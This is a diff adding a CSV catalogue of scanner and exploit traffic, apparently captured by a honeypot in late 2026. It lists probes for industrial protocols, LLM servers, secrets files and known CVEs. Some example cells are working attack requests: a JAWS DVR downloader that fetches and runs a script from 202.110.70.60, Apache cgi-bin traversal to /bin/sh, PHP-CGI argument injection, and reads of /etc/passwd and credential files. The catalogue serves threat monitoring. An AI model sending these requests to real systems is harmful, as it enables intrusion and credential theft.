@@ -1,0 +1,37 @@
+name,what,hits,sources,first_seen,last_seen,example
+alpn-sweep,"TLS ClientHello offering 5+ ALPN protocols, to see which one the server picks",86993,3652,2026-10-17T07:27:46Z,2026-11-01T08:37:02Z,
+mglndd,MGLNDD_<ip>_<port> banner sent to every port,4384,1757,2026-10-17T07:28:14Z,2026-11-01T08:38:05Z,
+mcp-hunting,Looking for exposed MCP (Model Context Protocol) servers at /mcp or /sse,22552,1620,2026-10-17T07:38:20Z,2026-11-01T08:34:26Z,/mcp
+x11,X11 connection setup on 6000-6002,1436,1148,2026-10-17T07:46:23Z,2026-11-01T08:19:05Z,
+modbus,Modbus/TCP on 502,170,129,2026-10-17T13:17:32Z,2026-11-01T06:38:22Z,
+s7comm,Siemens S7 (ISO-TSAP) on 102,252,124,2026-10-17T09:31:44Z,2026-11-01T06:17:17Z,
+dotenv,Requests for .env secrets files,124921,119,2026-10-17T10:04:25Z,2026-11-01T08:22:28Z,/.env
+docker-api,"Docker Engine API (/containers/json, /version on 2375)",170,117,2026-10-17T09:29:07Z,2026-11-01T08:34:34Z,/containers/json
+ethernet-ip,EtherNet/IP (CIP) on 44818,124,113,2026-10-17T08:53:51Z,2026-11-01T06:38:46Z,
+bacnet,BACnet on udp/47808,109,106,2026-10-17T12:21:44Z,2026-11-01T02:30:39Z,\x81\n\x00\x11\x01\x04\x00\x05\x01\x0c\x0c\x02?\xff\xff\x19K\x00
+dnp3,DNP3 on 20000,105,98,2026-10-17T07:44:20Z,2026-11-01T05:45:43Z,
+vxworks-wdb,VxWorks WDB debug agent on udp/17185,106,96,2026-10-17T08:22:03Z,2026-11-01T06:33:22Z,\x1a\x09\xfa\xba\x00\x00\x00\x00\x00\x00\x00\x02UUUU\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xffU\x12\x00\x00\x00<\x00\x00\x00\x01\x00\x00\x
+adb,Android Debug Bridge CNXN handshake,257,84,2026-10-17T10:45:45Z,2026-11-01T03:46:42Z,
+ntp-monlist,NTP mode-7 monlist request (amplification check),205,82,2026-10-17T07:46:53Z,2026-11-01T07:02:49Z,\x17\x00\x03*\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+redtail,RedTail cryptominer spreader (libredtail-http user agent),1559,76,2026-10-17T08:19:31Z,2026-11-01T08:34:34Z,/containers/json
+sglang-weights,SGLang /update_weights_from_*: push new weights into an LLM server,99,58,2026-10-17T14:12:51Z,2026-11-01T06:03:07Z,/update_weights_from_tensor
+git-config,Exposed /.git/config,2093,50,2026-10-17T10:15:19Z,2026-11-01T08:21:24Z,/.git/config
+websiphon,WebSiphon secrets scanner (user agent),17154,49,2026-10-17T10:04:25Z,2026-10-21T11:31:16Z,/
+cgi-bin-traversal,"Apache cgi-bin path traversal, CVE-2021-41773/42013",45,41,2026-10-17T08:19:31Z,2026-10-31T12:57:26Z,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
+gtp,GTP-C echo request on udp/2123 (mobile network core),44,41,2026-10-17T07:51:40Z,2026-11-01T08:05:06Z,@\x01\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+ollama-openai-api,"Ollama and OpenAI-compatible LLM APIs (/api/tags, /v1/models, ...)",130,40,2026-10-19T00:42:26Z,2026-11-01T02:38:56Z,/v1/models
+censys-dht,BitTorrent DHT ping whose node ID spells 'censysinspectscanner',62,40,2026-10-17T14:25:01Z,2026-11-01T08:04:21Z,d1:ad2:id20:censysinspectscannere1:q4:ping1:t2:aa1:y1:qe
+aws-credentials,Exposed .aws/credentials,1005,39,2026-10-17T10:15:19Z,2026-10-31T21:19:22Z,/.aws/credentials
+php-cgi-argument-injection,"PHP-CGI argument injection, CVE-2024-4577 (allow_url_include)",172,34,2026-10-17T08:19:40Z,2026-10-31T12:57:43Z,/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
+runpod-jupyter,RunPod and Jupyter config/secrets files,315,31,2026-10-17T10:15:19Z,2026-10-20T20:53:18Z,/.runpod/config.toml
+sap-metadatauploader,"SAP NetWeaver Visual Composer upload, CVE-2025-31324",30,30,2026-10-17T14:58:12Z,2026-11-01T07:52:45Z,/developmentserver/metadatauploader
+react-server-actions,"POSTs with a Next-Action header, the shape of React2Shell (CVE-2025-55182)",574,29,2026-10-17T13:50:57Z,2026-11-01T03:09:45Z,/
+jaws-shell,JAWS DVR /shell?<command> downloader,27,14,2026-10-18T02:15:39Z,2026-10-31T21:02:07Z,/shell?cd+/tmp;rm+wget.sh;wget+http:/\/202.110.70.60:800/wget.sh;sh+wget.sh+jaws
+upnp-addportmapping,UPnP AddPortMapping over HTTP (asks a router to open a port),96,13,2026-10-17T07:25:01Z,2026-10-31T16:18:18Z,/picsdesc.xml
+kubernetes-api,"Kubernetes API paths (/api/v1/pods, /apis/)",763,11,2026-10-17T12:00:14Z,2026-10-31T05:56:34Z,/apis/.env
+vite-fs,Vite dev-server file read through /@fs/ (CVE-2025-30208 family),369,11,2026-10-18T03:13:56Z,2026-10-29T08:24:08Z,/@fs/etc/passwd?import&raw??
+nextjs-middleware-bypass,"Next.js middleware bypass, CVE-2025-29927 (x-middleware-subrequest header)",4301,8,2026-10-17T17:10:48Z,2026-10-30T07:04:36Z,/
+ai-crawler-costume,"/z9x8c7v6b5-debug-trigger-<host>, sent with a different AI crawler user agent each time",12,6,2026-10-22T14:25:44Z,2026-10-30T07:04:25Z,/z9x8c7v6b5-debug-trigger-hostmaster.googledrive.download
+krebsonsecurity-ua,Botnet dropper whose user agent is 'KrebsOnSecurity',17,5,2026-10-18T02:15:39Z,2026-10-31T19:21:02Z,/shell?cd+/tmp;rm+wget.sh;wget+http:/\/202.110.70.60:800/wget.sh;sh+wget.sh+jaws
+literal-pwd,Wordlist bug: a literal $(pwd) in the requested path,64,2,2026-10-21T14:34:05Z,2026-10-27T19:30:19Z,/$(pwd)/.env.production
+poop1234,Next.js exploit tool sending x-nextjs-request-id: poop1234,105,1,2026-10-17T13:50:57Z,2026-10-31T19:20:57Z,/api/route
